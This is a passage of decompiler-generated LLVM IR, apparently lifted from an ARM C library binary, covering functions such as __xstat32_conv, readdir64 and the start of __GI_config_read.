  %v0_16664 = load i32, i32* %r7.global-to-local, align 4
  %v1_16664 = load i32, i32* %r5.global-to-local, align 4
  %v2_16664 = add i32 %v1_16664, 48
  %v3_16664 = inttoptr i32 %v2_16664 to i32*
  store i32 %v0_16664, i32* %v3_16664, align 4
  %v0_16668 = load i32, i32* %r8.global-to-local, align 4
  %v1_16668 = load i32, i32* %r5.global-to-local, align 4
  %v2_16668 = add i32 %v1_16668, 52
  %v3_16668 = inttoptr i32 %v2_16668 to i32*
  store i32 %v0_16668, i32* %v3_16668, align 4
  %v0_1666c = load i32, i32* %r2.global-to-local, align 4
  %v1_1666c = load i32, i32* %r5.global-to-local, align 4
  %v2_1666c = add i32 %v1_1666c, 16
  %v3_1666c = inttoptr i32 %v2_1666c to i32*
  store i32 %v0_1666c, i32* %v3_1666c, align 4
  %v0_16670 = load i32, i32* %r6.global-to-local, align 4
  %v1_16670 = add i32 %v0_16670, 88
  store i32 %v1_16670, i32* %r3.global-to-local, align 4
  %v1_16674 = add i32 %v0_16670, 20
  %v2_16674 = inttoptr i32 %v1_16674 to i32*
  %v3_16674 = load i32, i32* %v2_16674, align 4
  store i32 %v3_16674, i32* %r2.global-to-local, align 4
  %v1_16678 = inttoptr i32 %v1_16670 to i32*
  %v2_16678 = load i32, i32* %v1_16678, align 4
  %v3_16678 = add i32 %v0_16670, 92
  %v4_16678 = inttoptr i32 %v3_16678 to i32*
  %v5_16678 = load i32, i32* %v4_16678, align 4
  store i32 %v5_16678, i32* %r1.global-to-local, align 4
  %v1_1667c = add i32 %v0_16670, 64
  store i32 %v1_1667c, i32* %r6.global-to-local, align 4
  %v1_16680 = inttoptr i32 %v1_1667c to i32*
  %v2_16680 = load i32, i32* %v1_16680, align 4
  store i32 %v2_16680, i32* %r6.global-to-local, align 4
  %v3_16680 = add i32 %v0_16670, 68
  %v4_16680 = inttoptr i32 %v3_16680 to i32*
  %v5_16680 = load i32, i32* %v4_16680, align 4
  store i32 %v5_16680, i32* %r7.global-to-local, align 4
  %v0_16684 = load i32, i32* %r5.global-to-local, align 4
  %v1_16684 = add i32 %v0_16684, 88
  store i32 %v1_16684, i32* %r3.global-to-local, align 4
  %v2_16688 = add i32 %v0_16684, 20
  %v3_16688 = inttoptr i32 %v2_16688 to i32*
  store i32 %v3_16674, i32* %v3_16688, align 4
  %v0_1668c = load i32, i32* %ip.global-to-local, align 4
  %v1_1668c = load i32, i32* %r5.global-to-local, align 4
  %v2_1668c = add i32 %v1_1668c, 24
  %v3_1668c = inttoptr i32 %v2_1668c to i32*
  store i32 %v0_1668c, i32* %v3_1668c, align 4
  %v0_16690 = load i32, i32* %lr.global-to-local, align 4
  %v1_16690 = load i32, i32* %r5.global-to-local, align 4
  %v2_16690 = add i32 %v1_16690, 28
  %v3_16690 = inttoptr i32 %v2_16690 to i32*
  store i32 %v0_16690, i32* %v3_16690, align 4
  %v0_16694 = load i32, i32* %r6.global-to-local, align 4
  %v1_16694 = load i32, i32* %r5.global-to-local, align 4
  %v2_16694 = add i32 %v1_16694, 64
  %v3_16694 = inttoptr i32 %v2_16694 to i32*
  store i32 %v0_16694, i32* %v3_16694, align 4
  %v0_16698 = load i32, i32* %r7.global-to-local, align 4
  %v1_16698 = load i32, i32* %r5.global-to-local, align 4
  %v2_16698 = add i32 %v1_16698, 68
  %v3_16698 = inttoptr i32 %v2_16698 to i32*
  store i32 %v0_16698, i32* %v3_16698, align 4
  %v0_1669c = load i32, i32* %r3.global-to-local, align 4
  %v1_1669c = inttoptr i32 %v0_1669c to i32*
  store i32 %v2_16678, i32* %v1_1669c, align 4
  %v3_1669c = add i32 %v0_1669c, 4
  %v4_1669c = inttoptr i32 %v3_1669c to i32*
  %v5_1669c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1669c, i32* %v4_1669c, align 4
  %v2_166a0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_166a0, i32* %r4.global-to-local, align 4
  ret i32 %v2_16678

; uselistorder directives
  uselistorder i32 %v0_16670, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_16648, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_166a8 = load i32, i32* @r4, align 4
  store i32 %v3_166a8, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v3_166c0 = inttoptr i32 %arg2 to i8*
  %v4_166c0 = call i32 @__GI_memset(i8* %v3_166c0, i32 0, i32 88)
  %v2_166c4 = load i32, i32* %arg1, align 4
  %v3_166c4 = add i32 %tmp, 4
  %v4_166c4 = inttoptr i32 %v3_166c4 to i32*
  %v5_166c4 = load i32, i32* %v4_166c4, align 4
  store i32 %v5_166c4, i32* %r4.global-to-local, align 4
  %v0_166c8 = load i32, i32* %r6.global-to-local, align 4
  %v1_166c8 = inttoptr i32 %v0_166c8 to i32*
  store i32 %v2_166c4, i32* %v1_166c8, align 4
  %v3_166c8 = add i32 %v0_166c8, 4
  %v4_166c8 = inttoptr i32 %v3_166c8 to i32*
  %v5_166c8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_166c8, i32* %v4_166c8, align 4
  %v0_166cc = load i32, i32* %r5.global-to-local, align 4
  %v1_166cc = add i32 %v0_166cc, 32
  %v1_166d0 = inttoptr i32 %v1_166cc to i32*
  %v2_166d0 = load i32, i32* %v1_166d0, align 4
  %v3_166d0 = add i32 %v0_166cc, 36
  %v4_166d0 = inttoptr i32 %v3_166d0 to i32*
  %v5_166d0 = load i32, i32* %v4_166d0, align 4
  store i32 %v5_166d0, i32* %r4.global-to-local, align 4
  %v1_166d4 = add i32 %v0_166cc, 96
  %v2_166d4 = inttoptr i32 %v1_166d4 to i32*
  %v3_166d4 = load i32, i32* %v2_166d4, align 4
  store i32 %v3_166d4, i32* %r2.global-to-local, align 4
  %v1_166d8 = load i32, i32* %r6.global-to-local, align 4
  %v2_166d8 = add i32 %v1_166d8, 32
  %v3_166d8 = inttoptr i32 %v2_166d8 to i32*
  store i32 %v2_166d0, i32* %v3_166d8, align 4
  %v0_166dc = load i32, i32* %r4.global-to-local, align 4
  %v1_166dc = load i32, i32* %r6.global-to-local, align 4
  %v2_166dc = add i32 %v1_166dc, 36
  %v3_166dc = inttoptr i32 %v2_166dc to i32*
  store i32 %v0_166dc, i32* %v3_166dc, align 4
  %v0_166e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_166e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_166e0 = add i32 %v1_166e0, 12
  %v3_166e0 = inttoptr i32 %v2_166e0 to i32*
  store i32 %v0_166e0, i32* %v3_166e0, align 4
  %v0_166e4 = load i32, i32* %r5.global-to-local, align 4
  %v1_166e4 = add i32 %v0_166e4, 48
  %v2_166e4 = inttoptr i32 %v1_166e4 to i32*
  %v3_166e4 = load i32, i32* %v2_166e4, align 4
  %v1_166e8 = add i32 %v0_166e4, 24
  store i32 %v1_166e8, i32* %ip.global-to-local, align 4
  %v1_166ec = inttoptr i32 %v1_166e8 to i32*
  %v2_166ec = load i32, i32* %v1_166ec, align 4
  store i32 %v2_166ec, i32* %ip.global-to-local, align 4
  %v3_166ec = add i32 %v0_166e4, 28
  %v4_166ec = inttoptr i32 %v3_166ec to i32*
  %v5_166ec = load i32, i32* %v4_166ec, align 4
  store i32 %v5_166ec, i32* %lr.global-to-local, align 4
  %v1_166f0 = load i32, i32* %r6.global-to-local, align 4
  %v2_166f0 = add i32 %v1_166f0, 44
  %v3_166f0 = inttoptr i32 %v2_166f0 to i32*
  store i32 %v3_166e4, i32* %v3_166f0, align 4
  %v0_166f4 = load i32, i32* %r5.global-to-local, align 4
  %v1_166f4 = add i32 %v0_166f4, 64
  %v2_166f4 = inttoptr i32 %v1_166f4 to i32*
  %v3_166f4 = load i32, i32* %v2_166f4, align 4
  %v1_166f8 = add i32 %v0_166f4, 56
  %v2_166f8 = inttoptr i32 %v1_166f8 to i32*
  %v3_166f8 = load i32, i32* %v2_166f8, align 4
  store i32 %v3_166f8, i32* %r2.global-to-local, align 4
  %v1_166fc = load i32, i32* %r6.global-to-local, align 4
  %v2_166fc = add i32 %v1_166fc, 52
  %v3_166fc = inttoptr i32 %v2_166fc to i32*
  store i32 %v3_166f4, i32* %v3_166fc, align 4
  %v0_16700 = load i32, i32* %r2.global-to-local, align 4
  %v1_16700 = load i32, i32* %r6.global-to-local, align 4
  %v2_16700 = add i32 %v1_16700, 48
  %v3_16700 = inttoptr i32 %v2_16700 to i32*
  store i32 %v0_16700, i32* %v3_16700, align 4
  %v0_16704 = load i32, i32* %r5.global-to-local, align 4
  %v1_16704 = add i32 %v0_16704, 72
  %v1_16708 = inttoptr i32 %v1_16704 to i32*
  %v2_16708 = load i32, i32* %v1_16708, align 4
  %v3_16708 = add i32 %v0_16704, 76
  %v4_16708 = inttoptr i32 %v3_16708 to i32*
  %v5_16708 = load i32, i32* %v4_16708, align 4
  store i32 %v5_16708, i32* %r1.global-to-local, align 4
  %v0_1670c = load i32, i32* %r6.global-to-local, align 4
  %v1_1670c = add i32 %v0_1670c, 56
  %v1_16710 = inttoptr i32 %v1_1670c to i32*
  store i32 %v2_16708, i32* %v1_16710, align 4
  %v3_16710 = add i32 %v0_1670c, 60
  %v4_16710 = inttoptr i32 %v3_16710 to i32*
  %v5_16710 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16710, i32* %v4_16710, align 4
  %v0_16714 = load i32, i32* %r5.global-to-local, align 4
  %v1_16714 = add i32 %v0_16714, 80
  %v1_16718 = inttoptr i32 %v1_16714 to i32*
  %v2_16718 = load i32, i32* %v1_16718, align 4
  %v3_16718 = add i32 %v0_16714, 84
  %v4_16718 = inttoptr i32 %v3_16718 to i32*
  %v5_16718 = load i32, i32* %v4_16718, align 4
  store i32 %v5_16718, i32* %r1.global-to-local, align 4
  %v0_1671c = load i32, i32* %r6.global-to-local, align 4
  %v1_1671c = add i32 %v0_1671c, 64
  %v1_16720 = inttoptr i32 %v1_1671c to i32*
  store i32 %v2_16718, i32* %v1_16720, align 4
  %v3_16720 = add i32 %v0_1671c, 68
  %v4_16720 = inttoptr i32 %v3_16720 to i32*
  %v5_16720 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16720, i32* %v4_16720, align 4
  %v0_16724 = load i32, i32* %r5.global-to-local, align 4
  %v1_16724 = add i32 %v0_16724, 16
  %v2_16724 = inttoptr i32 %v1_16724 to i32*
  %v3_16724 = load i32, i32* %v2_16724, align 4
  %v1_16728 = load i32, i32* %r6.global-to-local, align 4
  %v2_16728 = add i32 %v1_16728, 16
  %v3_16728 = inttoptr i32 %v2_16728 to i32*
  store i32 %v3_16724, i32* %v3_16728, align 4
  %v0_1672c = load i32, i32* %r5.global-to-local, align 4
  %v1_1672c = add i32 %v0_1672c, 88
  %v1_16730 = add i32 %v0_1672c, 20
  %v2_16730 = inttoptr i32 %v1_16730 to i32*
  %v3_16730 = load i32, i32* %v2_16730, align 4
  store i32 %v3_16730, i32* %r2.global-to-local, align 4
  %v1_16734 = inttoptr i32 %v1_1672c to i32*
  %v2_16734 = load i32, i32* %v1_16734, align 4
  %v3_16734 = add i32 %v0_1672c, 92
  %v4_16734 = inttoptr i32 %v3_16734 to i32*
  %v5_16734 = load i32, i32* %v4_16734, align 4
  store i32 %v5_16734, i32* %r1.global-to-local, align 4
  %v0_16738 = load i32, i32* %r6.global-to-local, align 4
  %v1_16738 = add i32 %v0_16738, 72
  %v1_1673c = inttoptr i32 %v1_16738 to i32*
  store i32 %v2_16734, i32* %v1_1673c, align 4
  %v3_1673c = add i32 %v0_16738, 76
  %v4_1673c = inttoptr i32 %v3_1673c to i32*
  %v5_1673c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1673c, i32* %v4_1673c, align 4
  %v0_16740 = load i32, i32* %r2.global-to-local, align 4
  %v1_16740 = load i32, i32* %r6.global-to-local, align 4
  %v2_16740 = add i32 %v1_16740, 20
  %v3_16740 = inttoptr i32 %v2_16740 to i32*
  store i32 %v0_16740, i32* %v3_16740, align 4
  %v0_16744 = load i32, i32* %ip.global-to-local, align 4
  %v1_16744 = load i32, i32* %r6.global-to-local, align 4
  %v2_16744 = add i32 %v1_16744, 24
  %v3_16744 = inttoptr i32 %v2_16744 to i32*
  store i32 %v0_16744, i32* %v3_16744, align 4
  %v0_16748 = load i32, i32* %lr.global-to-local, align 4
  %v1_16748 = load i32, i32* %r6.global-to-local, align 4
  %v2_16748 = add i32 %v1_16748, 28
  %v3_16748 = inttoptr i32 %v2_16748 to i32*
  store i32 %v0_16748, i32* %v3_16748, align 4
  %v2_1674c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1674c, i32* %r4.global-to-local, align 4
  ret i32 %v2_16734

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 96, { 4, 2, 3, 0, 1, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* @r6, align 4
  %v1_16768 = add i32 %tmp, 24
  store i32 %v1_16768, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_16780 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 112) to i32*), align 4
  store i32 %v4_16780, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_16780)
  %v0_16794 = load i32, i32* @r6, align 4
  %v2_16794 = add i32 %v0_16794, 16
  %v3_16794 = inttoptr i32 %v2_16794 to i32*
  %v4_16794 = load i32, i32* %v3_16794, align 4
  store i32 %v4_16794, i32* %ip.global-to-local, align 4
  store i32 92064, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_16794)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_167a4

dec_label_pc_167a4:                               ; preds = %dec_label_pc_167d4, %entry
  %v0_167a4 = load i32, i32* @r5, align 4
  %v1_167a4 = add i32 %v0_167a4, 4
  %v2_167a4 = inttoptr i32 %v1_167a4 to i32*
  %v3_167a4 = load i32, i32* %v2_167a4, align 4
  %v4_167a4 = add i32 %v0_167a4, 8
  %v5_167a4 = inttoptr i32 %v4_167a4 to i32*
  %v6_167a4 = load i32, i32* %v5_167a4, align 4
  %tmp10 = icmp ugt i32 %v6_167a4, %v3_167a4
  br i1 %tmp10, label %dec_label_pc_167d4, label %dec_label_pc_167b0

dec_label_pc_167b0:                               ; preds = %dec_label_pc_167a4
  %v1_167b0 = inttoptr i32 %v0_167a4 to i32*
  %v2_167b0 = load i32, i32* %v1_167b0, align 4
  %v1_167b4 = add i32 %v0_167a4, 12
  %v2_167b4 = inttoptr i32 %v1_167b4 to i32*
  %v3_167b4 = load i32, i32* %v2_167b4, align 4
  %v1_167b8 = add i32 %v0_167a4, 20
  %v2_167b8 = inttoptr i32 %v1_167b8 to i32*
  %v3_167b8 = load i32, i32* %v2_167b8, align 4
  %v4_167bc = inttoptr i32 %v3_167b4 to i32*
  %v5_167bc = call i32 @__getdents64(i32 %v2_167b0, i32* %v4_167bc, i32 %v3_167b8, i32 %v6_167a4)
  %tmp9 = icmp slt i32 %v5_167bc, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_167cc

.thread:                                          ; preds = %dec_label_pc_167b0
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_16804

dec_label_pc_167cc:                               ; preds = %dec_label_pc_167b0
  %v1_167cc = load i32, i32* @r5, align 4
  %v2_167cc = add i32 %v1_167cc, 8
  %v3_167cc = inttoptr i32 %v2_167cc to i32*
  store i32 %v5_167bc, i32* %v3_167cc, align 4
  %v0_167d0 = load i32, i32* @r7, align 4
  %v1_167d0 = load i32, i32* @r5, align 4
  %v2_167d0 = add i32 %v1_167d0, 4
  %v3_167d0 = inttoptr i32 %v2_167d0 to i32*
  store i32 %v0_167d0, i32* %v3_167d0, align 4
  %v0_167d4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_167d4

dec_label_pc_167d4:                               ; preds = %dec_label_pc_167a4, %dec_label_pc_167cc
  %v1_167f8 = phi i32 [ %v0_167a4, %dec_label_pc_167a4 ], [ %v0_167d4.pre, %dec_label_pc_167cc ]
  %v1_167d4 = add i32 %v1_167f8, 4
  %v2_167d4 = inttoptr i32 %v1_167d4 to i32*
  %v3_167d4 = load i32, i32* %v2_167d4, align 4
  %v1_167d8 = add i32 %v1_167f8, 12
  %v2_167d8 = inttoptr i32 %v1_167d8 to i32*
  %v3_167d8 = load i32, i32* %v2_167d8, align 4
  %v2_167dc = add i32 %v3_167d8, %v3_167d4
  store i32 %v2_167dc, i32* @r4, align 4
  %v3_167e0 = inttoptr i32 %v2_167dc to i32*
  %v4_167e0 = load i32, i32* %v3_167e0, align 4
  %v1_167e4 = add i32 %v2_167dc, 4
  %v2_167e4 = inttoptr i32 %v1_167e4 to i32*
  %v3_167e4 = load i32, i32* %v2_167e4, align 4
  %v1_167e8 = add i32 %v2_167dc, 16
  %v2_167e8 = inttoptr i32 %v1_167e8 to i16*
  %v3_167e8 = load i16, i16* %v2_167e8, align 2
  %v4_167e8 = zext i16 %v3_167e8 to i32
  %v1_167ec = add i32 %v2_167dc, 8
  %v2_167ec = inttoptr i32 %v1_167ec to i32*
  %v3_167ec = load i32, i32* %v2_167ec, align 4
  store i32 %v3_167ec, i32* %ip.global-to-local, align 4
  %v2_167f0 = add i32 %v4_167e8, %v3_167d4
  %v2_167f4 = or i32 %v3_167e4, %v4_167e0
  %v4_167f4 = icmp eq i32 %v2_167f4, 0
  store i32 %v2_167f0, i32* %v2_167d4, align 4
  %v0_167fc = load i32, i32* %ip.global-to-local, align 4
  %v1_167fc = load i32, i32* @r5, align 4
  %v2_167fc = add i32 %v1_167fc, 16
  %v3_167fc = inttoptr i32 %v2_167fc to i32*
  store i32 %v0_167fc, i32* %v3_167fc, align 4
  br i1 %v4_167f4, label %dec_label_pc_167a4, label %dec_label_pc_16804

dec_label_pc_16804:                               ; preds = %dec_label_pc_167d4, %.thread
  %v0_16810 = load i32, i32* @r6, align 4
  %v2_16810 = add i32 %v0_16810, 44
  %v3_16810 = inttoptr i32 %v2_16810 to i32*
  %v4_16810 = load i32, i32* %v3_16810, align 4
  store i32 %v4_16810, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_16810)
  %v0_1681c = load i32, i32* @r4, align 4
  ret i32 %v0_1681c

; uselistorder directives
  uselistorder i32 %v2_167dc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_167f8, { 1, 0 }
  uselistorder i32 %v6_167a4, { 1, 0 }
  uselistorder i32 %v0_167a4, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 112, { 1, 2, 3, 0, 4 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 112) to i32*), { 0, 1, 2, 3, 4, 7, 5, 6 }
  uselistorder label %dec_label_pc_167d4, { 1, 0 }
}

define i32 @function_16830(i32 %arg1) local_unnamed_addr {
dec_label_pc_16830:
  %v0_16830 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16830, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_16830
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_16830, %bb
  %v4_1683c = phi i32 [ %arg1, %dec_label_pc_16830 ], [ 0, %bb ]
  ret i32 %v4_1683c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_16840 = load i32, i32* @r4, align 4
  %v6_16840 = load i32, i32* @r5, align 4
  %v9_16840 = load i32, i32* @r6, align 4
  %v12_16840 = load i32, i32* @r7, align 4
  %v15_16840 = load i32, i32* @r8, align 4
  %v18_16840 = load i32, i32* @sb, align 4
  %v21_16840 = load i32, i32* @sl, align 4
  %v24_16840 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_16844 = icmp eq i32* %arg1, null
  store i1 %v2_16844, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_16844, label %dec_label_pc_16b54, label %dec_label_pc_1685c

dec_label_pc_1685c:                               ; preds = %entry
  %v1_1685c = urem i32 %arg3, 256
  store i32 %v1_1685c, i32* @sb, align 4
  %v1_16860 = udiv i32 %arg3, 256
  %v3_16864 = urem i32 %v1_16860, 256
  %v3_16868 = mul nuw nsw i32 %v1_1685c, 4
  %v1_16870 = or i32 %v3_16868, 1
  %v1_1687c = and i32 %arg3, 131072
  %v1_16880 = add nsw i32 %v1_1685c, -1
  %v1_1688c = and i32 %arg3, 262144
  store i32 %v1_1688c, i32* %r2.global-to-local, align 4
  %v1_16890 = and i32 %arg3, 65536
  store i32 %v1_16890, i32* %r3.global-to-local, align 4
  store i32 %v1_16890, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_168a0 = add i32 %arg4, 1
  store i32 %v1_168a0, i32* @sl, align 4
  %v2_16a18 = icmp eq i32 %v1_1687c, 0
  %v1_16a70 = inttoptr i32 %arg2 to i32*
  %v2_16a88 = icmp eq i32 %v1_1688c, 0
  br label %dec_label_pc_168a4

dec_label_pc_168a4:                               ; preds = %dec_label_pc_168a4.backedge, %dec_label_pc_1685c
  %v2_168c0 = phi i32 [ %v0_168a4.pre, %dec_label_pc_168a4.backedge ], [ %tmp, %dec_label_pc_1685c ]
  %v1_168a4 = add i32 %v2_168c0, 4
  %v2_168a4 = inttoptr i32 %v1_168a4 to i32*
  %v3_168a4 = load i32, i32* %v2_168a4, align 4
  store i32 %v3_168a4, i32* %r3.global-to-local, align 4
  %v2_168a8 = icmp eq i32 %v3_168a4, 0
  store i1 %v2_168a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_168a8, label %dec_label_pc_168b0, label %dec_label_pc_168f8

dec_label_pc_168b0:                               ; preds = %dec_label_pc_168a4
  %v1_168b0 = add i32 %v2_168c0, 16
  %v2_168b0 = inttoptr i32 %v1_168b0 to i32*
  %v3_168b0 = load i32, i32* %v2_168b0, align 4
  store i32 %v3_168b0, i32* %r3.global-to-local, align 4
  %v2_168b4 = icmp eq i32 %v3_168b0, 0
  store i1 %v2_168b4, i1* %cpsr_z.global-to-local, align 1
  %v1_168b8 = add i32 %v2_168c0, 8
  %v2_168b8 = inttoptr i32 %v1_168b8 to i32*
  %v3_168b8 = load i32, i32* %v2_168b8, align 4
  store i32 %v3_168b8, i32* %r3.global-to-local, align 4
  br i1 %v2_168b4, label %bb, label %bb64

bb:                                               ; preds = %dec_label_pc_168b0
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_168b0, align 4
  %v0_168c4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_168b0, %bb
  %v0_168c4 = phi i32 [ %v0_168c4.pre, %bb ], [ %v3_168b8, %dec_label_pc_168b0 ]
  %v2_168c4 = icmp eq i32 %v0_168c4, 0
  store i1 %v2_168c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_168c4, label %bb65, label %.thread

bb65:                                             ; preds = %bb64
  store i32 %v1_16870, i32* %r3.global-to-local, align 4
  %v2_168cc = load i32, i32* @r5, align 4
  %v3_168cc = add i32 %v2_168cc, 8
  %v4_168cc = inttoptr i32 %v3_168cc to i32*
  store i32 %v1_16870, i32* %v4_168cc, align 4
  br label %.thread

.thread:                                          ; preds = %bb64, %bb65
  %v0_168d0 = load i32, i32* @r5, align 4
  %v1_168d0 = add i32 %v0_168d0, 16
  %v2_168d0 = inttoptr i32 %v1_168d0 to i32*
  %v3_168d0 = load i32, i32* %v2_168d0, align 4
  store i32 %v3_168d0, i32* %r0.global-to-local, align 4
  %v1_168d4 = add i32 %v0_168d0, 8
  %v2_168d4 = inttoptr i32 %v1_168d4 to i32*
  %v3_168d4 = load i32, i32* %v2_168d4, align 4
  store i32 %v3_168d4, i32* %r3.global-to-local, align 4
  %v2_168d8 = add i32 %v3_168d4, %v3_168d0
  store i32 %v2_168d8, i32* @r0, align 4
  %v0_168dc = call i32 @malloc()
  store i32 %v0_168dc, i32* %r0.global-to-local, align 4
  %v2_168e0 = icmp eq i32 %v0_168dc, 0
  store i1 %v2_168e0, i1* %cpsr_z.global-to-local, align 1
  %v1_168e4 = load i32, i32* @r5, align 4
  %v2_168e4 = add i32 %v1_168e4, 4
  %v3_168e4 = inttoptr i32 %v2_168e4 to i32*
  store i32 %v0_168dc, i32* %v3_168e4, align 4
  br i1 %v2_168e0, label %dec_label_pc_16b54, label %dec_label_pc_168ec

dec_label_pc_168ec:                               ; preds = %.thread
  %v0_168ec = load i32, i32* @r5, align 4
  %v1_168ec = add i32 %v0_168ec, 20
  %v2_168ec = inttoptr i32 %v1_168ec to i32*
  %v3_168ec = load i32, i32* %v2_168ec, align 4
  %v1_168f0 = or i32 %v3_168ec, 1
  store i32 %v1_168f0, i32* %r3.global-to-local, align 4
  store i32 %v1_168f0, i32* %v2_168ec, align 4
  %v0_168f8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_168f8

dec_label_pc_168f8:                               ; preds = %dec_label_pc_168a4, %dec_label_pc_168ec
  %v1_16900 = phi i32 [ %v2_168c0, %dec_label_pc_168a4 ], [ %v0_168f8.pre, %dec_label_pc_168ec ]
  %v1_168f8 = add i32 %v1_16900, 4
  %v2_168f8 = inttoptr i32 %v1_168f8 to i32*
  %v3_168f8 = load i32, i32* %v2_168f8, align 4
  store i32 %v3_168f8, i32* %r2.global-to-local, align 4
  %v4_168f8 = add i32 %v1_16900, 8
  %v5_168f8 = inttoptr i32 %v4_168f8 to i32*
  %v6_168f8 = load i32, i32* %v5_168f8, align 4
  %v2_168fc = add i32 %v6_168f8, %v3_168f8
  store i32 %v2_168fc, i32* %r3.global-to-local, align 4
  %v2_16900 = add i32 %v1_16900, 12
  %v3_16900 = inttoptr i32 %v2_16900 to i32*
  store i32 %v2_168fc, i32* %v3_16900, align 4
  %v0_16904 = load i32, i32* @fp, align 4
  store i32 %v0_16904, i32* @r6, align 4
  br label %dec_label_pc_16908

dec_label_pc_16908:                               ; preds = %dec_label_pc_16994, %dec_label_pc_16980, %dec_label_pc_168f8
  %v0_16910 = phi i32 [ %v0_16904, %dec_label_pc_168f8 ], [ %v1_16980, %dec_label_pc_16980 ], [ %v0_16910.pre.pre, %dec_label_pc_16994 ]
  %v0_16908 = load i32, i32* @r5, align 4
  %v1_16908 = add i32 %v0_16908, 12
  store i32 %v1_16908, i32* %r0.global-to-local, align 4
  %v1_1690c = inttoptr i32 %v1_16908 to i32*
  %v2_1690c = load i32, i32* %v1_1690c, align 4
  store i32 %v2_1690c, i32* %r0.global-to-local, align 4
  %v3_1690c = add i32 %v0_16908, 16
  %v4_1690c = inttoptr i32 %v3_1690c to i32*
  %v5_1690c = load i32, i32* %v4_1690c, align 4
  %v2_16910 = add i32 %v2_1690c, %v0_16910
  store i32 %v2_16910, i32* %r0.global-to-local, align 4
  %v2_16914 = sub i32 %v5_1690c, %v0_16910
  %v1_16918 = inttoptr i32 %v0_16908 to i32*
  %v2_16918 = load i32, i32* %v1_16918, align 4
  store i32 %v2_16918, i32* %r2.global-to-local, align 4
  %v3_1691c = call i32 @fgets(i32 %v2_16910, i32 %v2_16914, i32 %v2_16918)
  store i32 %v3_1691c, i32* %r0.global-to-local, align 4
  store i32 %v3_1691c, i32* %r4.global-to-local, align 4
  %v2_16920 = icmp eq i32 %v3_1691c, 0
  store i1 %v2_16920, i1* %cpsr_z.global-to-local, align 1
  %v0_16928 = load i32, i32* @r5, align 4
  %v1_16928 = add i32 %v0_16928, 12
  br i1 %v2_16920, label %dec_label_pc_16928, label %dec_label_pc_16940

dec_label_pc_16928:                               ; preds = %dec_label_pc_16908
  store i32 %v1_16928, i32* %r0.global-to-local, align 4
  %v1_1692c = inttoptr i32 %v1_16928 to i32*
